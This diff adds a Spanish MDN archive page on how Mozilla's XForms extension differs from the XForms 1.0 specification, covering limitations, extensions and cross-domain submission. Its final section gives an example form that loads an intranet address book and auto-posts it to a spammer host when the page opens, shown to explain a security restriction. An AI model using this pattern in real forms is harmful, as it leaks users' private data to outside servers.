@@ -1,0 +1,116 @@
+---
+title: Mozilla XForms Specials
+slug: XForms/Soporte_en_Mozilla
+tags:
+  - Todas_las_Categorías
+  - XForms
+  - páginas_a_traducir
+translation_of: Archive/Web/XForms/Mozilla_XForms_Specials
+---
+<h3 id="Introducci.C3.B3n" name="Introducci.C3.B3n">Introducción</h3>
+
+<p>Este artículo dá una vista rápida sobre "dónde" se desvía la extensión Mozilla XForms respecto de la especificación oficial <em>XForms 1.0 </em>. Esto cubre ambas limitaciones, en la extensión y en extensiones personalizadas.</p>
+
+<h3 id="Limitaciones" name="Limitaciones">Limitaciones</h3>
+
+<h4 id="Repetir_usando_atributos" name="Repetir_usando_atributos">Repetir usando atributos</h4>
+
+<p>Las especificaciones hacen mención ha <a class="external" href="http://www.w3.org/TR/xforms/slice9.html#ui.repeat.via.attrs">"Creating Repeating Structures Via Attributes"</a>, esto es parcialmente soportadas.</p>
+
+<p>(limitación registrada en <a href="https://bugzilla.mozilla.org/show_bug.cgi?id=280368" title="FIXED: Support attribute-based repeats (first step)">error 280368</a>)</p>
+
+<h4 id="Mezcla_de_repetici.C3.B3n_de_tags_table_o_ul" name="Mezcla_de_repetici.C3.B3n_de_tags_table_o_ul">Combinando Repeat y <code>table</code> ó <code>ul</code></h4>
+
+<p>No es posible combinar <span style="font-size: small;"><em>repeat</em></span> ní con <span style="font-size: medium;"><em><code>table</code> </em></span>ó <span style="font-size: small;"><em>ul</em></span>. Esto significa que <strong>NO ES POSIBLE</strong> hacer lo siguiente:</p>
+
+<div class="warning">
+<pre>&lt;table&gt;
+  &lt;xf:repeat ...&gt;
+    &lt;tr&gt; ... &lt;/tr&gt;
+  &lt;/xf:repeat&gt;
+&lt;/table&gt;
+</pre>
+</div>
+
+<p>ó</p>
+
+<div class="warning">
+<pre>&lt;ul&gt;
+  &lt;xf:repeat ...&gt;
+    &lt;li&gt; ... &lt;/li&gt;
+  &lt;/xf:repeat&gt;
+&lt;/ul&gt;
+</pre>
+</div>
+
+<p><a class="external" href="http://www.w3.org/TR/2006/REC-xforms-20060314/slice9.html#ui.repeat.via.attrs">La sección 9.3.2</a> establece que las combinaciones con <em>table</em> probablemente nunca funcionarán. Las combinaciones con <em>ul</em> deben sufrir la misma limitación, aunque no deberían producir errores fatales como tampoco lo hace (<a href="https://bugzilla.mozilla.org/show_bug.cgi?id=330022" title="FIXED: CRASH using repeat + ul/li">error 330022</a>).</p>
+
+<h4 id="Soporte_a_pseudo_clases" name="Soporte_a_pseudo_clases">Soporte para Pseudo Clases</h4>
+
+<p>Actualmente soportamos todas las Pseudo Clases en XForms (<code>:enabled, :disabled</code>, etc. ), <strong>a excepción de</strong> <code>:read-only</code> y <code>:read-write</code>, por no tener un comportamiento no específico para (X)<a href="/es/HTML" title="es/HTML">HTML</a>. En su lugar se debe usar<code>:-moz-read-only</code> and <code>:-moz-read-write</code>, por el momento.</p>
+
+<p>(limitación registrada en <a href="https://bugzilla.mozilla.org/show_bug.cgi?id=313111" title="Use :read-only/:read-write instead of :-moz-read-only/:-moz-read-write">error 313111</a>)</p>
+
+<h4 id="Soporte_de_pseudo_elementos" name="Soporte_de_pseudo_elementos">Soporte de pseudo elementos</h4>
+
+<p>No se soportan los pseudo elementos (<code>::value, ::repeat-item, y ::repeat-index</code> ). En su lugar se deben usar las siguientes clases:</p>
+
+<ul>
+ <li><code>xf-value</code></li>
+ <li><code>xf-repeat-item</code></li>
+ <li><code>xf-repeat-index</code></li>
+</ul>
+
+<p>Por ejemplo, para tomar el valor de un control <code>input</code>, hay que usar:</p>
+
+<pre>@namespace xf url("http://www.w3.org/2002/xforms");
+xf|input .xf-value {
+  ...
+}
+</pre>
+
+<p>Los pseudo elementos están definidos en la <em>Especificación de Interfaz Básico para el Usuario <a href="/es/CSS" title="es/CSS">CSS</a>3</em> .</p>
+
+<p>(Limitation registrada en <a href="https://bugzilla.mozilla.org/show_bug.cgi?id=271724" title="Implement CSS pseudoelements needed for XForms">error 271724</a>)</p>
+
+<h3 id="Extensiones" name="Extensiones">Extensiones</h3>
+
+<h4 id="Enumerar_instancias" name="Enumerar_instancias">Enumerando instancias</h4>
+
+<p>El elemento estandarizado <a href="/es/NsIXFormsModelElement" title="es/NsIXFormsModelElement">nsIXFormsModelElement</a> no permite enumerar todas las posibles instancias, sino sólo recuperar instancias por sus nombres. En la <em>Extensión XForms de Mozilla</em> hemos añadido una función <code>getInstanceDocuments()</code> a el <em>modelo</em> que retorna todas las <em>instancias modelo</em> del documento. Esto está documentado en <a href="/es/NsIXFormsNSModelElement" title="es/NsIXFormsNSModelElement">nsIXFormsNSModelElement</a>.</p>
+
+<h4 id="Llegar_al_elemento_de_instancia_desde_un_nodo_de_datos" name="Llegar_al_elemento_de_instancia_desde_un_nodo_de_datos">Obteniendo un elemento de instancia desde un nodo de dato</h4>
+
+<p>En la especificación XForms 1.0 no hay manera de conseguir el elemento <code>instance</code> desde la instancia de un nodo de dato. Hemos añadido una función a través de un llamado tipo <code>getFeature()</code> para cada nodo, lo que permite al autor del formulario hacer eso. Es decir: si <code>instanceNode</code> es un nodo dentro una instancia de un documento, entonces:</p>
+
+<pre>instanceNode.getFeature("org.mozilla.xforms.instanceOwner", "1.0")</pre>
+
+<p>devolverá el elemento <code>&lt;instance&gt;</code> (dentro del documento principal) al cual pertenece el nodo.</p>
+
+<h4 id="Llegar_al_documento_de_instancia_desde_el_elemento_de_instancia" name="Llegar_al_documento_de_instancia_desde_el_elemento_de_instancia">Llegar a la instancia de documento desde la instancia de elemento</h4>
+
+<p>Según la especificación XForms 1.0 hay que usar el elemento <code>model</code> para obtener la <span style="font-size: x-small;">instance</span> del documento. Parece un poco torpe, cuando ya se dispone del elemento <code>instance</code>, así que hemos añadido una función <code>getInstanceDocument()</code> directamente en el elemento <code>instance</code> como un atajo. Esto está documentado en <a href="/es/NsIXFormsNSInstanceElement" title="es/NsIXFormsNSInstanceElement">nsIXFormsNSInstanceElement</a>.</p>
+
+<h4 id="Interfaz_de_control_del_usuario" name="Interfaz_de_control_del_usuario">Interfaz de control del usuario</h4>
+
+<p>Hemos añadido mucha funcionalidad a nuestro interfaz de usuario, lo cual permite al autor del formulario crear sus propios <em>controles de usuario</em>. Ello implica publicar algo de funcionalidad (en un script) en todos nuestros controles, como <code>output</code>, <code>input</code>, etc., y permitir que el interfaz de usuario se represente en <a href="/es/XBL" title="es/XBL">XBL</a>. Más información en <a href="/es/XForms/Custom_Controls" title="es/XForms/Custom_Controls">XForms:Custom Controls</a>.</p>
+
+<h3 id="Misc" name="Misc">Misc</h3>
+
+<h4 id="Cross_Domain_Submission" name="Cross_Domain_Submission">Envíos cruzados a dominios</h4>
+
+<p>No es exactamente una limitación ni una extensión, pero es importante mencionarlo aquí. Por razones de seguridad, por fallo no es posible para un XForms enviar datos a otro dominio. Esto se por razones de seguridad. Información de como hacer una lista de confianza puede ser encontrada en la sección Release Notes</p>
+
+<p>El chequeo de envío entre dominios además incluye formas cargadas desde <code><a class="external" rel="freelink">file://</a></code>. Las formas cargadas desde esa URL deberían ser archivos locales y de confianza, pero no siempre son el caso. Por esto no hay listas de confianza automáticas de archivos locales.</p>
+
+<p>Si estás preguntándote porqué tenemos esta restricción, aquí hay un simple ejemplo del porqué:</p>
+
+<pre>&lt;xforms:model&gt;
+  &lt;xforms:instance src="http://intranetserver/addrbook.xml"/&gt;
+  &lt;xforms:submission id="sub" action="http://megaspammer.com/gather"
+                     method="post"/&gt;
+  &lt;xforms:send submission="sub" ev:event="xforms-ready"/&gt;
+&lt;/xforms:model&gt;
+</pre>
+
+<p>Esto traería algo que es accesible únicamente para tí (p.e. detrás de un cortafuegos) <code><span class="nowiki">http://intranetserver/addrbook.xml</span></code>, luego enviarlo a <code><span class="nowiki">http://megaspammer.com/gather</span></code> tan pronto como veas la XForm.</p>
